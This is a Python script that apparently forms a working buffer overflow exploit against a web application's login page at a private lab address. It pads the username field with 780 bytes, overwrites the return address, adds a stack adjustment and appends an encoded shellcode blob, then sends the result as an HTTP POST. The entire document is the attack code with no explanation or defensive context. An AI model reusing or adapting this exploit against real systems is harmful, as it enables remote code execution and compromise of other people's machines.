import socket
import sys

try:
    print("\nSending evil buffer...")
    shellcode = ("\x31\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76"
"\x0e\x9c\xbc\xb0\xbd\x83\xee\xfc\xe2\xf4\x60\x54\x32\xbd"
"\x9c\xbc\xd0\x34\x79\x8d\x70\xd9\x17\xec\x80\x36\xce\xb0"
"\x3b\xef\x88\x37\xc2\x95\x93\x0b\xfa\x9b\xad\x43\x1c\x81"
"\xfd\xc0\xb2\x91\xbc\x7d\x7f\xb0\x9d\x7b\x52\x4f\xce\xeb"
"\x3b\xef\x8c\x37\xfa\x81\x17\xf0\xa1\xc5\x7f\xf4\xb1\x6c"
"\xcd\x37\xe9\x9d\x9d\x6f\x3b\xf4\x84\x5f\x8a\xf4\x17\x88"
"\x3b\xbc\x4a\x8d\x4f\x11\x5d\x73\xbd\xbc\x5b\x84\x50\xc8"
"\x6a\xbf\xcd\x45\xa7\xc1\x94\xc8\x78\xe4\x3b\xe5\xb8\xbd"
"\x63\xdb\x17\xb0\xfb\x36\xc4\xa0\xb1\x6e\x17\xb8\x3b\xbc"
"\x4c\x35\xf4\x99\xb8\xe7\xeb\xdc\xc5\xe6\xe1\x42\x7c\xe3"
"\xef\xe7\x17\xae\x5b\x30\xc1\xd4\x83\x8f\x9c\xbc\xd8\xca"
"\xef\x8e\xef\xe9\xf4\xf0\xc7\x9b\x9b\x43\x65\x05\x0c\xbd"
"\xb0\xbd\xb5\x78\xe4\xed\xf4\x95\x30\xd6\x9c\x43\x65\xed"
"\xcc\xec\xe0\xfd\xcc\xfc\xe0\xd5\x76\xb3\x6f\x5d\x63\x69"
"\x27\xd7\x99\xd4\x70\x15\x22\x39\xd8\xbf\x9c\xbd\x0b\x34"
"\x7a\xd6\xa0\xeb\xcb\xd4\x29\x18\xe8\xdd\x4f\x68\x19\x7c"
"\xc4\xb1\x63\xf2\xb8\xc8\x70\xd4\x40\x08\x3e\xea\x4f\x68"
"\xf4\xdf\xdd\xd9\x9c\x35\x53\xea\xcb\xeb\x81\x4b\xf6\xae"
"\xe9\xeb\x7e\x41\xd6\x7a\xd8\x98\x8c\xbc\x9d\x31\xf4\x99"
"\x8c\x7a\xb0\xf9\xc8\xec\xe6\xeb\xca\xfa\xe6\xf3\xca\xea"
"\xe3\xeb\xf4\xc5\x7c\x82\x1a\x43\x65\x34\x7c\xf2\xe6\xfb"
"\x63\x8c\xd8\xb5\x1b\xa1\xd0\x42\x49\x07\x40\x08\x3e\xea"
"\xd8\x1b\x09\x01\x2d\x42\x49\x80\xb6\xc1\x96\x3c\x4b\x5d"
"\xe9\xb9\x0b\xfa\x8f\xce\xdf\xd7\x9c\xef\x4f\x68")
    filler = "A" * 780
    eip = "\x83\x0c\x09\x10"
    offset = "C" * 4
    sub_esp_10 = "\x83\xec\x10"

    inputBuffer = filler + eip + offset + sub_esp_10 + shellcode
    content = "username=" + inputBuffer + "&password=1"
    buffer = "POST /login HTTP/1.1\r\n"
    buffer += "Host: 192.168.190.152\r\n"
    buffer += "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:102.0) Gecko/20100101 Firefox/102.0\r\n"
    buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\n"
    buffer += "Accept-Language: en-US,en;q=0.5\r\n"
    buffer += "Accept-Encoding: gzip, deflate\r\n"
    buffer += "Referer: http://192.168.190.152/login\r\n"
    buffer += "Connection: keep-alive\r\n"
    buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
    buffer += "Content-Length: "+str(len(content))+"\r\n"
    buffer += "Origin: http://192.168.190.152\r\n"
    buffer += "Upgrade-Insecure-Requests: 1\r\n"
    buffer += "\r\n"
    buffer += content
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("192.168.190.152", 80))
    s.send(buffer)
    s.close()
    print("\nDone!")
except:
    print("Could not connect!")
    sys.exit()